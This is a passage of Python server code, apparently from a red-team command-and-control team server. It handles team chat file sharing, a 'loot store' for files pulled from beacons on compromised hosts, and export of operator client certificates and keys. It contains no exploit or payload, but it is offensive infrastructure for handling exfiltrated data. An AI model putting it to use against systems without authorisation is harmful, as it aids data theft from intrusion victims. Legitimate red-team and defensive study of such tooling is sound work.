        `chat.message`. Reads are exempt: the client polls
        `/chat/poll` every few seconds and only reads `/topic`
        on an explicit operator command, so the read path does
        not need a bucket, and charging it one would be the
        wrong budget to draw from.
        """
        payload = request.get_json(force=True, silent=True) or {}

        if request.method == 'GET' or 'text' not in payload:
            return jsonify({'topic': self.chat.get_topic()})

        if not _chat_rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.topic', outcome='throttled',
                detail='chat rate limit exceeded')
            resp = jsonify({
                'error': 'chat rate limit exceeded',
                'hint': (f'{constants.CHAT_PER_SEC}/sec sustained, '
                         f'{constants.CHAT_BURST} burst'),
            })
            resp.status_code = 429
            return resp

        new_text = (payload.get('text') or '').strip()

        old, new = self.chat.set_topic(new_text, name)

        if new['text']:
            detail = f'set {new["text"]!r}'
        else:
            detail = f'cleared (was {old.get("text", "")!r})'
        self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='chat.topic', target='team',
            detail=detail[:512])

        return jsonify({'ok': True, 'topic': new})

    def _chat_file_upload(self, name, role, ip):
        """Accept a file upload for the chat room.

        The server never opens, parses, sniffs, or executes the
        bytes. It decodes the base64 body, stores the raw bytes
        under their SHA-256, and posts a chat message of kind
        'file' that announces the upload. The original filename
        is stored only as the message body — where it goes
        through the same sanitizer every other chat body does —
        and is never used as a filesystem path.

        Three caps apply, all refused rather than pruned: per-
        file size, total store size, and file count. Every cap
        violation is audited with outcome='error'.
        """
        if self.chat.files is None:
            return Response(status=503)

        if not _chat_rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='throttled',
                detail='chat rate limit exceeded')
            resp = jsonify({
                'error': 'chat rate limit exceeded',
                'hint': (f'{constants.CHAT_PER_SEC}/sec sustained, '
                         f'{constants.CHAT_BURST} burst'),
            })
            resp.status_code = 429
            return resp

        payload = request.get_json(force=True, silent=True) or {}
        raw_name = (payload.get('name') or '').strip()
        data_b64 = payload.get('data_b64') or ''
        if not isinstance(data_b64, str):
            return Response(status=400)

        import base64 as _b64
        max_b64 = (FileStore.MAX_FILE_BYTES * 4) // 3 + 16
        if len(data_b64) > max_b64:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='error',
                detail=f'file too large (b64 len {len(data_b64)})')
            resp = jsonify({
                'error': 'file too large',
                'audit_id': audit_id,
            })
            resp.status_code = 413
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        try:
            data = _b64.b64decode(data_b64, validate=True)
        except Exception:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='error',
                detail='invalid base64')
            resp = jsonify({
                'error': 'invalid base64',
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        display_name = _sanitize_chat_text(raw_name) or 'file'

        try:
            meta = self.chat.files.store(
                data, uploaded_by=name,
                display_name=display_name)
        except ValueError as exc:
            msg = str(exc)
            status = 413 if ('too large' in msg
                             or 'full' in msg) else 400
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='error',
                detail=msg[:200])
            resp = jsonify({'error': msg, 'audit_id': audit_id})
            resp.status_code = status
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='error',
                detail=f'disk write failed: {exc}')
            resp = jsonify({
                'error': 'storage failure',
                'audit_id': audit_id,
            })
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        try:
            msg = self.chat.post(
                name, role, display_name,
                kind='file', source_ip=ip,
                file_hash=meta['sha256'],
                file_size=meta['size'])
        except ValueError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='error',
                detail=f'post failed: {exc}')
            resp = jsonify({
                'error': str(exc),
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='chat.message', target='team', outcome='ok',
            detail=(f'file sha256={meta["sha256"]} '
                    f'size={meta["size"]} '
                    f'name={display_name!r}'))

        return jsonify({
            'ok':       True,
            'sha256':   meta['sha256'],
            'size':     meta['size'],
            'deduped':  meta['deduped'],
            'message':  msg,
            'audit_id': audit_id,
        })

    def _chat_file_list(self, name, role, ip):
        """List every file in the store.

        The chat ring is per-process and cleared on restart; the
        file store is on disk and survives. Without this endpoint
        the only way to discover an uploaded file after a restart
        is to grep the audit chain for its hash, which is not
        what an operator should have to do to find a file their
        teammate shared yesterday.
        """
        if self.chat.files is None:
            return Response(status=503)

        if not _chat_rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='throttled',
                detail='chat rate limit exceeded')
            resp = jsonify({
                'error': 'chat rate limit exceeded',
                'hint': (f'{constants.CHAT_PER_SEC}/sec sustained, '
                         f'{constants.CHAT_BURST} burst'),
            })
            resp.status_code = 429
            return resp

        rows = self.chat.files.list_all()
        rows.sort(key=lambda r: r['ts'], reverse=True)

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='chat.file', target='list',
            outcome='ok', detail=f'{len(rows)} files')

        return jsonify({'files': rows, 'audit_id': audit_id})

    def _chat_file_download(self, name, role, ip):
        """Serve a stored file by hash.

        Returns the bytes base64-encoded inside a JSON envelope.
        The server never inspects the bytes — it reads the file
        for the hash, encodes it, and writes the response. No
        MIME sniffing, no content-type discovery, no filename in
        any response header. The client chooses the save path
        locally and verifies the SHA-256 after decode.

        The hash is validated as 64 lowercase hex before any
        filesystem lookup, so a request with a traversal-shaped
        hash string cannot escape the store directory.
        """
        if self.chat.files is None:
            return Response(status=503)

        if not _chat_rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='throttled',
                detail='chat rate limit exceeded')
            resp = jsonify({
                'error': 'chat rate limit exceeded',
                'hint': (f'{constants.CHAT_PER_SEC}/sec sustained, '
                         f'{constants.CHAT_BURST} burst'),
            })
            resp.status_code = 429
            return resp

        payload = request.get_json(force=True, silent=True) or {}
        digest = (payload.get('sha256') or '').strip().lower()

        if not FileStore.is_valid_hash(digest):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', target=digest[:16],
                outcome='error', detail='invalid hash')
            resp = jsonify({
                'error': 'invalid sha256',
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        data = self.chat.files.read(digest)
        if data is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', target=digest[:16],
                outcome='error', detail='not found')
            resp = jsonify({
                'error': 'file not found',
                'audit_id': audit_id,
            })
            resp.status_code = 404
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        import base64 as _b64
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='chat.file', target=digest[:16],
            outcome='ok', detail=f'download size={len(data)}')

        return jsonify({
            'ok':       True,
            'sha256':   digest,
            'size':     len(data),
            'data_b64': _b64.b64encode(data).decode('ascii'),
            'audit_id': audit_id,
        })

    def _chat_file_delete(self, name, role, ip):
        """Delete a stored file if the caller owns it.

        Ownership is by first-upload. A deduped re-upload by a
        different operator does not transfer ownership; see
        FileStore.delete for the semantics and the failure mode
        when the owner removes a blob that another operator's
        message references.

        Every outcome — success, not-found, not-owner, malformed
        hash, disk error, rate-limit trip — writes a `chat.file`
        audit entry. A refused delete is visible in the chain so
        an attempted takedown of someone else's file leaves a
        trace.
        """
        if self.chat.files is None:
            return Response(status=503)

        if not _chat_rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', outcome='throttled',
                detail='chat rate limit exceeded')
            resp = jsonify({
                'error': 'chat rate limit exceeded',
                'hint': (f'{constants.CHAT_PER_SEC}/sec sustained, '
                         f'{constants.CHAT_BURST} burst'),
            })
            resp.status_code = 429
            return resp

        payload = request.get_json(force=True, silent=True) or {}
        digest = (payload.get('sha256') or '').strip().lower()

        if not FileStore.is_valid_hash(digest):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', target=digest[:16],
                outcome='error', detail='invalid hash on delete')
            resp = jsonify({
                'error': 'invalid sha256',
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        try:
            meta = self.chat.files.delete(digest, requester=name)
        except FileNotFoundError:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', target=digest[:16],
                outcome='error', detail='delete: not found')
            resp = jsonify({
                'error': 'file not found',
                'audit_id': audit_id,
            })
            resp.status_code = 404
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except PermissionError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', target=digest[:16],
                outcome='denied', detail=f'delete: {exc}'[:200])
            resp = jsonify({
                'error': str(exc),
                'audit_id': audit_id,
            })
            resp.status_code = 403
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='chat.file', target=digest[:16],
                outcome='error',
                detail=f'delete disk error: {exc}'[:200])
            resp = jsonify({
                'error': 'storage failure',
                'audit_id': audit_id,
            })
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='chat.file', target=digest[:16],
            outcome='ok',
            detail=f'delete size={meta["size"]} '
                   f'owner={meta["owner"]}')
        return jsonify({
            'ok':       True,
            'sha256':   digest,
            'size':     meta['size'],
            'owner':    meta['owner'],
            'audit_id': audit_id,
        })

    # ------------------------------------------------------------------
    # Loot store

    def _loot_list(self, name, role, ip):
        """List every file in the loot store.

        Newest first. Each row carries the standard fields plus
        the loot-specific source_path and source_beacon so a
        recipient knows where the file came from.
        """
        if self.loot is None:
            return Response(status=503)

        rows = self.loot.list_all()
        rows.sort(key=lambda r: r['ts'], reverse=True)

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='loot.list', outcome='ok',
            detail=f'{len(rows)} files')

        return jsonify({
            'files': rows,
            'audit_id': audit_id,
        })

    def _loot_upload(self, name, role, ip):
        """Register a loot file.

        The client sends the bytes base64-encoded along with the
        SHA-256 it computed locally after the beacon download.
        The server re-derives the digest from the received bytes
        and refuses if they disagree — this is the property that
        makes the store trustworthy for another operator who
        retrieves the file later by hash.

        Dedup is by hash: two operators uploading the same bytes
        from different beacons share one blob, and the first
        uploader's provenance sticks. Same trade the chat file
        store makes.
        """
        if self.loot is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}

        digest = (payload.get('sha256') or '').strip().lower()
        data_b64 = payload.get('data_b64') or ''
        source_path = (payload.get('source_path') or '')[:1024]
        display_name = (payload.get('name') or '')[:256]
        try:
            source_beacon = int(payload.get('source_beacon') or 0)
        except (TypeError, ValueError):
            source_beacon = 0

        if not FileStore.is_valid_hash(digest):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.store', target=digest[:16],
                outcome='error', detail='invalid sha256')
            resp = jsonify({
                'error': 'invalid sha256',
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        if not isinstance(data_b64, str):
            return Response(status=400)

        import base64 as _b64
        max_b64 = (LootStore.MAX_FILE_BYTES * 4) // 3 + 16
        if len(data_b64) > max_b64:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.store', target=digest[:16],
                outcome='error',
                detail=f'file too large (b64 len {len(data_b64)})')
            resp = jsonify({
                'error': 'file too large',
                'audit_id': audit_id,
            })
            resp.status_code = 413
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        try:
            data = _b64.b64decode(data_b64, validate=True)
        except Exception:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.store', target=digest[:16],
                outcome='error', detail='invalid base64')
            resp = jsonify({
                'error': 'invalid base64',
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        got = hashlib.sha256(data).hexdigest()
        if got != digest:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.store', target=digest[:16],
                outcome='error',
                detail=f'sha256 mismatch (claimed {digest[:16]}, '
                       f'got {got[:16]})')
            resp = jsonify({
                'error': f'sha256 mismatch (claimed {digest}, '
                         f'computed {got})',
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        display_name = _sanitize_chat_text(display_name) or 'loot'
        source_path = _sanitize_chat_text(source_path)

        try:
            info = self.loot.store(
                data,
                uploaded_by=name,
                display_name=display_name,
                source_path=source_path,
                source_beacon=source_beacon,
            )
        except ValueError as exc:
            msg = str(exc)
            status = 413 if ('too large' in msg
                             or 'full' in msg) else 400
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.store', target=digest[:16],
                outcome='error', detail=msg[:200])
            resp = jsonify({'error': msg, 'audit_id': audit_id})
            resp.status_code = status
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.store', target=digest[:16],
                outcome='error',
                detail=f'disk write failed: {exc}')
            resp = jsonify({
                'error': 'storage failure',
                'audit_id': audit_id,
            })
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='loot.store', target=info['sha256'][:16],
            outcome='ok',
            detail=(f'size={info["size"]} '
                    f'name={display_name!r} '
                    f'source={source_path!r} '
                    f'beacon=#{source_beacon} '
                    f'dedup={"yes" if info.get("deduped") else "no"}'))

        return jsonify({
            'ok':       True,
            'sha256':   info['sha256'],
            'size':     info['size'],
            'deduped':  bool(info.get('deduped')),
            'audit_id': audit_id,
        })

    # ------------------------------------------------------------------
    # Loot chunked upload

    def _loot_upload_init(self, name, role, ip):
        if self.loot is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}
        digest = (payload.get('sha256') or '').strip().lower()
        try:
            total_size = int(payload.get('total_size') or 0)
        except (TypeError, ValueError):
            total_size = 0
        display_name = (payload.get('name') or '')[:256]
        source_path = (payload.get('source_path') or '')[:1024]
        try:
            source_beacon = int(payload.get('source_beacon') or 0)
        except (TypeError, ValueError):
            source_beacon = 0

        if not FileStore.is_valid_hash(digest):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload', target=digest[:16],
                outcome='error', detail='invalid sha256')
            resp = jsonify({'error': 'invalid sha256',
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        if total_size <= 0:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload', target=digest[:16],
                outcome='error',
                detail='missing or invalid total_size')
            resp = jsonify({'error': 'invalid total_size',
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        display_name = _sanitize_chat_text(display_name) or 'loot'
        source_path = _sanitize_chat_text(source_path)

        try:
            info = self.loot.initiate_upload(
                owner=name,
                total_size=total_size,
                sha256=digest,
                display_name=display_name,
                source_path=source_path,
                source_beacon=source_beacon,
            )
        except ValueError as exc:
            msg = str(exc)
            status = 413 if 'full' in msg else 400
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload', target=digest[:16],
                outcome='error', detail=msg[:200])
            resp = jsonify({'error': msg, 'audit_id': audit_id})
            resp.status_code = status
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload', target=digest[:16],
                outcome='error',
                detail=f'staging write failed: {exc}')
            resp = jsonify({'error': 'storage failure',
                            'audit_id': audit_id})
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='loot.upload', target=digest[:16],
            outcome='ok',
            detail=(f'init size={total_size} '
                    f'name={display_name!r} '
                    f'source={source_path!r} '
                    f'beacon=#{source_beacon} '
                    f'dedup={"yes" if info["deduped"] else "no"}'))

        return jsonify({
            'ok':         True,
            'upload_id':  info['upload_id'],
            'deduped':    bool(info['deduped']),
            'size':       info['size'],
            'chunk_size': LootStore.UPLOAD_CHUNK_SIZE,
            'audit_id':   audit_id,
        })

    def _loot_upload_chunk(self, name, role, ip):
        if self.loot is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}
        upload_id = (payload.get('upload_id') or '').strip()
        try:
            offset = int(payload.get('offset') or 0)
        except (TypeError, ValueError):
            return Response(status=400)
        data_b64 = payload.get('data_b64') or ''
        if not upload_id or not isinstance(data_b64, str):
            return Response(status=400)

        import base64 as _b64
        max_b64 = (LootStore.UPLOAD_CHUNK_SIZE * 4) // 3 + 4096
        if len(data_b64) > max_b64:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload.chunk', target=upload_id[:16],
                outcome='error',
                detail=f'chunk too large (b64 len {len(data_b64)})')
            resp = jsonify({'error': 'chunk too large',
                            'audit_id': audit_id})
            resp.status_code = 413
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        try:
            data = _b64.b64decode(data_b64, validate=True)
        except Exception:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload.chunk', target=upload_id[:16],
                outcome='error', detail='invalid base64')
            resp = jsonify({'error': 'invalid base64',
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        try:
            new_offset = self.loot.append_chunk(
                upload_id, offset, data)
        except ValueError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload.chunk', target=upload_id[:16],
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload.chunk', target=upload_id[:16],
                outcome='error',
                detail=f'disk write failed: {exc}')
            resp = jsonify({'error': 'storage failure',
                            'audit_id': audit_id})
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        return jsonify({
            'ok':     True,
            'offset': new_offset,
            'size':   len(data),
        })

    def _loot_upload_finish(self, name, role, ip):
        if self.loot is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}
        upload_id = (payload.get('upload_id') or '').strip()
        if not upload_id:
            return Response(status=400)

        try:
            info = self.loot.finish_upload(upload_id)
        except ValueError as exc:
            msg = str(exc)
            status = 413 if 'full' in msg else 400
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload.finish', target=upload_id[:16],
                outcome='error', detail=msg[:200])
            resp = jsonify({'error': msg, 'audit_id': audit_id})
            resp.status_code = status
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.upload.finish', target=upload_id[:16],
                outcome='error',
                detail=f'disk error: {exc}')
            resp = jsonify({'error': 'storage failure',
                            'audit_id': audit_id})
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='loot.store', target=info['sha256'][:16],
            outcome='ok',
            detail=(f'size={info["size"]} '
                    f'dedup={"yes" if info["deduped"] else "no"} '
                    f'(streamed)'))

        return jsonify({
            'ok':       True,
            'sha256':   info['sha256'],
            'size':     info['size'],
            'deduped':  bool(info['deduped']),
            'audit_id': audit_id,
        })

    def _loot_upload_abort(self, name, role, ip):
        if self.loot is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}
        upload_id = (payload.get('upload_id') or '').strip()
        if not upload_id:
            return Response(status=400)

        dropped = self.loot.abort_upload(upload_id)
        return jsonify({'ok': True, 'dropped': bool(dropped)})

    def _loot_download(self, name, role, ip):
        """Serve a loot file by hash.

        Returns the bytes base64-encoded inside a JSON envelope.
        No content-type, no filename in any response header —
        the client chooses the save path locally and re-verifies
        the SHA-256 after decode.
        """
        if self.loot is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}
        digest = (payload.get('sha256') or '').strip().lower()

        if not FileStore.is_valid_hash(digest):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.get', target=digest[:16],
                outcome='error', detail='invalid hash')
            resp = jsonify({
                'error': 'invalid sha256',
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        data = self.loot.read(digest)
        if data is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.get', target=digest[:16],
                outcome='error', detail='not found')
            resp = jsonify({
                'error': 'file not found',
                'audit_id': audit_id,
            })
            resp.status_code = 404
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        meta = self.loot.stat(digest) or {}

        import base64 as _b64
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='loot.get', target=digest[:16],
            outcome='ok', detail=f'download size={len(data)}')

        return jsonify({
            'ok':            True,
            'sha256':        digest,
            'size':          len(data),
            'name':          meta.get('name', '') or '',
            'source_path':   meta.get('source_path', '') or '',
            'source_beacon': meta.get('source_beacon', 0) or 0,
            'owner':         meta.get('owner', '') or '',
            'data_b64':      _b64.b64encode(data).decode('ascii'),
            'audit_id':      audit_id,
        })

    def _loot_delete(self, name, role, ip):
        """Delete a loot file if the caller owns it.

        Ownership is by first upload. A deduped re-upload by a
        different operator does not transfer ownership; see
        LootStore's inherited FileStore.delete for the full
        semantics. Refused attempts (not owner, not found,
        malformed hash) are audited so a takedown attempt against
        another operator's loot leaves a trail.
        """
        if self.loot is None:
            return Response(status=503)

        payload = request.get_json(force=True, silent=True) or {}
        digest = (payload.get('sha256') or '').strip().lower()

        if not FileStore.is_valid_hash(digest):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.delete', target=digest[:16],
                outcome='error', detail='invalid hash')
            resp = jsonify({
                'error': 'invalid sha256',
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        try:
            meta = self.loot.delete(
                digest, requester=name,
                is_admin=(role == 'admin'))
        except FileNotFoundError:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.delete', target=digest[:16],
                outcome='error', detail='not found')
            resp = jsonify({
                'error': 'file not found',
                'audit_id': audit_id,
            })
            resp.status_code = 404
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except PermissionError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.delete', target=digest[:16],
                outcome='denied', detail=str(exc)[:200])
            resp = jsonify({
                'error': str(exc),
                'audit_id': audit_id,
            })
            resp.status_code = 403
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except ValueError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.delete', target=digest[:16],
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({
                'error': str(exc),
                'audit_id': audit_id,
            })
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp
        except OSError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='loot.delete', target=digest[:16],
                outcome='error',
                detail=f'disk error: {exc}'[:200])
            resp = jsonify({
                'error': 'storage failure',
                'audit_id': audit_id,
            })
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        detail = (f'size={meta["size"]} '
                  f'owner={meta["owner"] or "?"}')
        if meta.get('overrode'):
            detail += ' override=admin'
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='loot.delete', target=digest[:16],
            outcome='ok', detail=detail)
        return jsonify({
            'ok':       True,
            'sha256':   digest,
            'size':     meta['size'],
            'owner':    meta['owner'],
            'overrode': bool(meta.get('overrode')),
            'audit_id': audit_id,
        })

    # ------------------------------------------------------------------
    # Config export

    def _build_operator_config(self, target, entry):
        """Assemble the client config JSON for `target`.

        Returns (blob_str, None) on success, (None, error_message)
        on failure. Caller must have already authorised the
        export — this helper assumes `target` exists and may be
        exported.

        Shared by _operators_export and _operators_passwd, so an
        operator who changes their own password does not need an
        admin to re-mint their config.
        """
        try:
            paths = self.registry.paths_for(target)
        except Exception as exc:
            return None, f'registry does not expose paths: {exc}'

        cert_path = paths.get('cert')
        key_path  = paths.get('key')
        ca_path   = paths.get('ca')
        missing = [p for p in (cert_path, key_path, ca_path)
                   if not p or not _os.path.isfile(p)]
        if missing:
            return None, ('credential files missing on the server: '
                          + ', '.join(missing))

        try:
            with open(ca_path, 'rb') as fh:
                ca_pem = fh.read().decode('utf-8')
            with open(cert_path, 'rb') as fh:
                client_cert = fh.read().decode('utf-8')
            with open(key_path, 'rb') as fh:
                client_key = fh.read().decode('utf-8')
        except OSError as exc:
            return None, f'read failed: {exc}'

        listener_fp = getattr(self, 'ca_fingerprint_loaded', None)
        if listener_fp:
            try:
                import ssl as _ssl
                cfg_ca_fp = hashlib.sha256(
                    _ssl.PEM_cert_to_DER_cert(ca_pem)).hexdigest()
            except Exception:
                cfg_ca_fp = None
            if cfg_ca_fp and cfg_ca_fp != listener_fp:
                return None, ('team CA was regenerated while the '
                              'server was running; restart the '
                              'handler, then re-run the command')

        host = request.host.split(':', 1)[0] if request.host else ''
        if not host or host in ('0.0.0.0', '::', 'localhost'):
            try:
                _probe = socket.socket(socket.AF_INET,
                                       socket.SOCK_DGRAM)
                _probe.settimeout(1.0)
                _probe.connect(('8.8.8.8', 1))
                host = _probe.getsockname()[0]
                _probe.close()
            except Exception:
                host = 'localhost'

        cfg_out = {
            'name':        target,
            'role':        entry.get('role', 'operator'),
            'server_host': host,
            'server_port': self.port,
            'ca_pem':      ca_pem,
            'client_cert': client_cert,
            'client_key':  client_key,
        }

        try:
            with open(self.registry.server_cert, 'rb') as fh:
                _server_pem = fh.read().decode('utf-8')
            import ssl as _ssl_fp
            _der = _ssl_fp.PEM_cert_to_DER_cert(_server_pem)
            cfg_out['server_cert_sha256'] = hashlib.sha256(
                _der).hexdigest()
        except Exception:
            cfg_out['server_cert_sha256'] = ''

        if entry.get('auth_hash'):
            cfg_out['password_required'] = True
            cfg_out['auth_algo'] = entry.get(
                'auth_algo', 'pbkdf2-sha256')
            cfg_out['auth_params'] = entry.get(
                'auth_params', {'iters': 200_000})
            cfg_out['auth_salt'] = entry.get('auth_salt', '')

        try:
            import base64 as _b64_sig

            handler_obj = getattr(self.engine, 'handler', None)
            canonical = json.dumps(
                cfg_out, sort_keys=True,
                separators=(',', ':')).encode('utf-8')

            def _try_sign(candidate, data):
                """Return (bytes, None) on success, or (None, why)."""
                if candidate is None:
                    return None, 'candidate is None'
                for name in ('sign', 'sign_bytes', 'sign_data',
                             'sign_payload', 'sign_der'):
                    fn = getattr(candidate, name, None)
                    if fn is None:
                        continue
                    if not callable(fn):
                        continue
                    try:
                        out = fn(data)
                    except Exception as exc:
                        return None, f"{name}() raised {type(exc).__name__}: {exc}"
                    if isinstance(out, bytes):
                        return out, None
                    if isinstance(out, str):
                        # Some signers return base64 directly.
                        return out.encode('ascii'), None
                    return None, f"{name}() returned {type(out).__name__}"
                return None, 'no callable sign method'

            def _try_public(candidate):
                """Return (PEM bytes, None) on success, or (None, why)."""
                if candidate is None:
                    return None, 'candidate is None'
                for name in ('public_pem', 'public_key_pem',
                             'get_public_pem', 'export_public_pem',
                             'public_key_spki_pem'):
                    fn = getattr(candidate, name, None)
                    if fn is None or not callable(fn):
                        continue
                    try:
                        out = fn()
                    except Exception as exc:
                        return None, f"{name}() raised {type(exc).__name__}: {exc}"
                    if isinstance(out, bytes):
                        return out, None
                    if isinstance(out, str):
                        return out.encode('utf-8'), None
                    return None, f"{name}() returned {type(out).__name__}"
                return None, 'no callable public-key method'

            sig_bytes = None
            pub_pem = None
            signer_desc = None
            last_err = ''

            # Shape 1 — a signer sub-object on the handler.
            if handler_obj is not None:
                for attr in ('signer', '_signer', 'handler_signer',
                             '_handler_signer', 'task_signer',
                             '_task_signer', 'ecdsa_signer',
                             '_ecdsa_signer'):
                    candidate = getattr(handler_obj, attr, None)
                    if candidate is None:
                        continue
                    s, s_err = _try_sign(candidate, canonical)
                    if s is None:
                        last_err = f"handler.{attr}: {s_err}"
                        continue
                    p, p_err = _try_public(candidate)
                    if p is None:
                        last_err = f"handler.{attr}: {p_err}"
                        continue
                    sig_bytes, pub_pem = s, p
                    signer_desc = f"handler.{attr}"
                    break

            # Shape 2 — sign/verify methods directly on the handler.
            if sig_bytes is None and handler_obj is not None:
                s, s_err = _try_sign(handler_obj, canonical)
                if s is not None:
                    p, p_err = _try_public(handler_obj)
                    if p is not None:
                        sig_bytes, pub_pem = s, p
                        signer_desc = "handler (direct)"
                    else:
                        last_err = f"handler (direct): {p_err}"
                else:
                    last_err = f"handler (direct): {s_err}"

            # Shape 3 — a bare `cryptography` ECDSA private key.
            if sig_bytes is None and handler_obj is not None:
                for attr in ('signing_key', '_signing_key',
                             'handler_key', '_handler_key',
                             'private_key', '_private_key'):
                    key = getattr(handler_obj, attr, None)
                    if key is None:
                        continue
                    try:
                        from cryptography.hazmat.primitives import (
